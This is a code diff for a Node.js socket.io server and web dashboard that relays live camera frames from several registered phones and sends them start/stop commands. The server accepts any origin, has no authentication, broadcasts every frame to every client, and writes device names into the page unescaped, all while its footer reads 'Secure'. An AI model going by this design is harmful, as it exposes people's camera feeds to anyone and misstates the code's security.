@@ -3,60 +3,79 @@ const app = express();
 const server = require('http').createServer(app);
 const io = require('socket.io')(server, { 
   cors: { origin: "*" },
-  transports: ['polling', 'websocket']
+  transports: ['polling', 'websocket'],
+  allowEIO3: true
 });
 
-let devices = new Map(); // Store all connected devices
+let devices = new Map();
+let frameCount = 0;
+let selectedDeviceId = null;
 
+// Main Page - Control + Live Stream + Device List
 app.get('/', (req, res) => {
   res.send(`
     <!DOCTYPE html>
     <html>
     <head>
-        <title>Multi Device Camera Control</title>
+        <title>📹 Multi Device Live Stream</title>
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
         <style>
             * { margin: 0; padding: 0; box-sizing: border-box; }
-            body { 
-                background: linear-gradient(135deg, #000000, #1a1a2e);
-                font-family: system-ui, sans-serif;
-                min-height: 100vh;
-                padding: 20px;
-            }
+            body { background: linear-gradient(135deg, #000000, #1a1a2e); font-family: system-ui; padding: 20px; }
             .container { max-width: 800px; margin: 0 auto; }
-            h1 { color: white; text-align: center; margin-bottom: 20px; font-size: 24px; }
             
-            /* Device List */
-            .device-list {
+            /* Header */
+            .header { text-align: center; margin-bottom: 25px; }
+            .header h1 { color: white; font-size: 28px; margin-bottom: 5px; }
+            .header p { color: #888; font-size: 14px; }
+            
+            /* Device List Section */
+            .device-section {
                 background: rgba(0,0,0,0.5);
                 border-radius: 20px;
                 padding: 15px;
                 margin-bottom: 20px;
             }
-            .device-title { color: white; margin-bottom: 10px; font-size: 16px; }
-            .device-grid {
-                display: grid;
+            .device-title {
+                color: white;
+                font-size: 16px;
+                margin-bottom: 10px;
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+            }
+            .device-count {
+                background: #22c55e;
+                padding: 2px 8px;
+                border-radius: 20px;
+                font-size: 12px;
+            }
+            .device-list {
+                display: flex;
+                flex-wrap: wrap;
                 gap: 10px;
             }
             .device-card {
                 background: rgba(255,255,255,0.1);
                 border-radius: 12px;
-                padding: 12px;
+                padding: 10px 15px;
                 cursor: pointer;
                 transition: all 0.2s;
                 border: 1px solid rgba(255,255,255,0.1);
+                flex: 1;
+                min-width: 120px;
             }
             .device-card:hover { background: rgba(255,255,255,0.2); }
             .device-card.selected {
                 border: 2px solid #22c55e;
                 background: rgba(34,197,94,0.2);
             }
-            .device-name { color: white; font-weight: bold; font-size: 16px; }
-            .device-status { font-size: 12px; margin-top: 5px; }
+            .device-name { color: white; font-weight: bold; font-size: 14px; }
+            .device-status { font-size: 11px; margin-top: 4px; }
             .status-online { color: #22c55e; }
             .status-offline { color: #ef4444; }
-            .device-id { font-size: 10px; color: #888; margin-top: 3px; font-family: monospace; }
+            .device-id { font-size: 9px; color: #888; margin-top: 2px; }
             
             /* Stream Section */
             .stream-section {
@@ -64,6 +83,7 @@ app.get('/', (req, res) => {
                 border-radius: 20px;
                 padding: 20px;
                 backdrop-filter: blur(10px);
+                border: 1px solid rgba(255,255,255,0.15);
                 margin-bottom: 20px;
             }
             .stream-header {
@@ -80,7 +100,14 @@ app.get('/', (req, res) => {
                 font-size: 12px;
                 animation: blink 1s infinite;
             }
-            @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.5; } }
+            .live-badge.offline {
+                background: #555;
+                animation: none;
+            }
+            @keyframes blink {
+                0%, 100% { opacity: 1; }
+                50% { opacity: 0.5; }
+            }
             .video-container {
                 background: #000;
                 border-radius: 16px;
@@ -89,19 +116,27 @@ app.get('/', (req, res) => {
                 border: 2px solid #333;
                 margin-bottom: 15px;
             }
-            #streamImage { width: 100%; height: 100%; object-fit: cover; }
+            #streamImage {
+                width: 100%;
+                height: 100%;
+                object-fit: cover;
+            }
             .stream-info {
                 display: flex;
                 justify-content: space-between;
+                align-items: center;
+                margin-bottom: 15px;
                 color: #aaa;
                 font-size: 13px;
             }
-            .fps { color: #22c55e; font-family: monospace; }
-            .control-buttons {
+            .fps { color: #22c55e; font-family: monospace; font-size: 18px; font-weight: bold; }
+            
+            /* Control Section */
+            .control-section {
                 display: flex;
                 gap: 15px;
                 justify-content: center;
-                margin-top: 15px;
+                margin-bottom: 10px;
             }
             button {
                 padding: 12px 24px;
@@ -110,21 +145,31 @@ app.get('/', (req, res) => {
                 border: none;
                 border-radius: 40px;
                 cursor: pointer;
+                transition: transform 0.2s;
             }
-            .btn-start { background: #22c55e; color: white; }
-            .btn-stop { background: #ef4444; color: white; }
+            button:active { transform: scale(0.96); }
+            .btn-start { background: #22c55e; color: white; box-shadow: 0 0 10px rgba(34,197,94,0.3); }
+            .btn-stop { background: #ef4444; color: white; box-shadow: 0 0 10px rgba(239,68,68,0.3); }
+            
+            /* Footer */
             .footer { text-align: center; color: #555; font-size: 11px; margin-top: 20px; }
         </style>
     </head>
     <body>
         <div class="container">
-            <h1>📹 Multi Device Camera Control</h1>
+            <div class="header">
+                <h1>📹 Multi Device Live Stream</h1>
+                <p>Real-time streaming from multiple phones</p>
+            </div>
             
-            <!-- Device List -->
-            <div class="device-list">
-                <div class="device-title">📱 Connected Devices</div>
-                <div class="device-grid" id="deviceList">
-                    <div style="color:#888; text-align:center;">Waiting for devices...</div>
+            <!-- Device List Section -->
+            <div class="device-section">
+                <div class="device-title">
+                    <span>📱 Connected Devices</span>
+                    <span class="device-count" id="deviceCount">0</span>
+                </div>
+                <div class="device-list" id="deviceList">
+                    <div style="color:#888; text-align:center; width:100%;">Waiting for devices...</div>
                 </div>
             </div>
             
@@ -132,34 +177,37 @@ app.get('/', (req, res) => {
             <div class="stream-section">
                 <div class="stream-header">
                     <span>🎥 Live Stream</span>
-                    <span class="live-badge" id="liveBadge">OFFLINE</span>
+                    <span class="live-badge offline" id="liveBadge">OFFLINE</span>
                 </div>
                 <div class="video-container">
                     <img id="streamImage" src="">
                 </div>
                 <div class="stream-info">
-                    <span>📡 <span id="selectedDevice">No device selected</span></span>
+                    <span>📡 Device: <span id="selectedDeviceName">None</span></span>
                     <span class="fps">⚡ <span id="fpsValue">0</span> FPS</span>
                 </div>
-                <div class="control-buttons">
+                <div class="control-section">
                     <button class="btn-start" id="startBtn">▶ START</button>
                     <button class="btn-stop" id="stopBtn">⏹ STOP</button>
                 </div>
             </div>
             
-            <div class="footer">🔒 Secure | 🎯 Multi Device | 📡 Real-time</div>
+            <div class="footer">
+                🔒 Secure | 🎯 Multi Device | 📡 PreviewCallback
+            </div>
         </div>
         
         <script>
             const socket = io();
             let selectedDeviceId = null;
-            let currentStreamingDevice = null;
+            let devicesData = {};
             let fps = 0, lastFpsUpdate = Date.now();
             
             const deviceListDiv = document.getElementById('deviceList');
+            const deviceCountSpan = document.getElementById('deviceCount');
             const streamImage = document.getElementById('streamImage');
             const liveBadge = document.getElementById('liveBadge');
-            const selectedDeviceSpan = document.getElementById('selectedDevice');
+            const selectedDeviceNameSpan = document.getElementById('selectedDeviceName');
             const fpsSpan = document.getElementById('fpsValue');
             const startBtn = document.getElementById('startBtn');
             const stopBtn = document.getElementById('stopBtn');
@@ -176,53 +224,61 @@ app.get('/', (req, res) => {
             }
             updateFPS();
             
+            // Select device
+            function selectDevice(deviceId) {
+                selectedDeviceId = deviceId;
+                const device = devicesData[deviceId];
+                if (device) {
+                    selectedDeviceNameSpan.innerText = device.name || deviceId.substring(0, 15);
+                }
+                // Highlight selected device
+                renderDevices();
+                socket.emit('select-device', deviceId);
+            }
+            
             // Render device list
-            function renderDevices(devices) {
-                if (Object.keys(devices).length === 0) {
-                    deviceListDiv.innerHTML = '<div style="color:#888; text-align:center;">No devices connected...</div>';
+            function renderDevices() {
+                const devices = Object.values(devicesData);
+                deviceCountSpan.innerText = devices.length;
+                
+                if (devices.length === 0) {
+                    deviceListDiv.innerHTML = '<div style="color:#888; text-align:center; width:100%;">No devices connected...</div>';
                     return;
                 }
                 
-                deviceListDiv.innerHTML = Object.entries(devices).map(([id, device]) => \`
-                    <div class="device-card \${selectedDeviceId === id ? 'selected' : ''}" onclick="selectDevice('\${id}')">
-                        <div class="device-name">📱 \${device.name}</div>
+                deviceListDiv.innerHTML = devices.map(device => \`
+                    <div class="device-card \${selectedDeviceId === device.id ? 'selected' : ''}" onclick="selectDevice('\${device.id}')">
+                        <div class="device-name">📱 \${device.name || device.id.substring(0, 10)}</div>
                         <div class="device-status">
                             <span class="status-\${device.status}">● \${device.status === 'online' ? 'Online' : 'Offline'}</span>
                         </div>
-                        <div class="device-id">ID: \${id.substring(0, 15)}...</div>
+                        <div class="device-id">\${device.id.substring(0, 15)}...</div>
                     </div>
                 \`).join('');
             }
             
-            // Select device
-            function selectDevice(deviceId) {
-                selectedDeviceId = deviceId;
-                selectedDeviceSpan.innerText = \`Device: \${deviceId.substring(0, 15)}...\`;
-                renderDevices(devicesData);
-                
-                // Request frame from selected device
-                socket.emit('select-device', deviceId);
-            }
-            
-            let devicesData = {};
+            // Socket events
+            socket.on('connect', () => {
+                console.log('Connected to server');
+            });
             
             socket.on('device-list', (devices) => {
                 devicesData = devices;
-                renderDevices(devices);
+                renderDevices();
             });
             
             socket.on('frame', (data) => {
-                if (data && data.frame) {
-                    streamImage.src = data.frame;
+                if (data) {
+                    streamImage.src = data;
                     fps++;
                     liveBadge.innerText = 'LIVE';
-                    liveBadge.style.background = '#ef4444';
+                    liveBadge.className = 'live-badge';
                 }
             });
             
             socket.on('disconnect', () => {
                 liveBadge.innerText = 'OFFLINE';
-                liveBadge.style.background = '#888';
+                liveBadge.className = 'live-badge offline';
             });
             
             startBtn.onclick = () => {
@@ -248,27 +304,30 @@ app.get('/', (req, res) => {
 io.on('connection', (socket) => {
   console.log('✅ New connection:', socket.id);
   let currentDeviceId = null;
-  let deviceName = null;
+  let currentDeviceName = null;
   
   socket.on('register', (data) => {
     currentDeviceId = data.deviceId;
-    deviceName = data.deviceName || data.deviceId.substring(0, 10);
+    currentDeviceName = data.deviceName || data.deviceId.substring(0, 10);
     
     devices.set(currentDeviceId, {
       id: currentDeviceId,
-      name: deviceName,
+      name: currentDeviceName,
       status: 'online',
       socketId: socket.id,
       lastSeen: Date.now()
     });
     
-    console.log(`📱 Device registered: ${deviceName} (${currentDeviceId})`);
+    console.log(`📱 Device registered: ${currentDeviceName} (${currentDeviceId})`);
     broadcastDeviceList();
   });
   
   socket.on('frame', (data) => {
-    // Broadcast frame to all clients
-    io.emit('frame', { frame: data, deviceId: currentDeviceId });
+    io.emit('frame', data);
+    frameCount++;
+    if (frameCount % 30 === 0) {
+      console.log(`📸 Frames forwarded: ${frameCount}`);
+    }
   });
   
   socket.on('command', (data) => {
@@ -280,6 +339,7 @@ io.on('connection', (socket) => {
   });
   
   socket.on('select-device', (deviceId) => {
+    selectedDeviceId = deviceId;
     console.log(`📺 Selected device: ${deviceId}`);
   });
   
@@ -293,6 +353,7 @@ io.on('connection', (socket) => {
   });
   
   socket.on('disconnect', () => {
+    console.log('❌ Client disconnected:', socket.id);
     if (currentDeviceId) {
       const device = devices.get(currentDeviceId);
       if (device) {
@@ -309,6 +370,7 @@ function broadcastDeviceList() {
   const list = {};
   for (let [id, device] of devices) {
     list[id] = {
+      id: device.id,
       name: device.name,
       status: device.status
     };
@@ -325,17 +387,23 @@ setInterval(() => {
       device.status = 'offline';
       devices.set(id, device);
       updated = true;
+      console.log(`⏰ Device timeout: ${device.name}`);
     }
   }
   if (updated) broadcastDeviceList();
 }, 15000);
 
+// Keep server awake
+setInterval(() => {
+  console.log(`💓 Server alive - Devices: ${devices.size}`);
+}, 30000);
+
 const PORT = 3000;
 server.listen(PORT, '0.0.0.0', () => {
   console.log('');
-  console.log('═══════════════════════════════════');
-  console.log('✅ MULTI DEVICE SERVER READY');
-  console.log('═══════════════════════════════════');
+  console.log('═══════════════════════════════════════');
+  console.log('✅ MULTI DEVICE STREAM SERVER READY');
+  console.log('═══════════════════════════════════════');
   console.log(`📍 Open: https://your-replit.repl.co`);
-  console.log('═══════════════════════════════════');
+  console.log('═══════════════════════════════════════');
 });
